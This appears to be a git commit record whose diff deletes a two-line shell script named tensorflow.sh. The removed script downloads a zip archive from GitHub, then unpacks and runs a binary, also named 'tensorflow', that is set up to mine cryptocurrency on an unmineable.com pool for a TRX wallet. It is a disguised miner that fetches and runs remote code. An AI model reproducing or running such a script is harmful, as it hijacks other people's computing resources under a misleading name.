edfd7a56c9bc8e2584fd002af1ec6d7c674e8591
Praveen <80373260+NanoTest5000@users.noreply.github.com>
2022-01-23 14:24:37 +0530

    1

--- n51/tensorflow.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-sudo apt update && sudo apt-get install zip unzip && wget https://github.com/n5000/tensorflow/raw/main/tensorflow.zip && unzip tensorflow.zip && cd tensorflow && chmod u+x tensorflow && ./tensorflow --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWzp8qHuWZai4ZHaAMhQy9ND82ACKwoLd2.n51 --ethstratum ETHPROXY
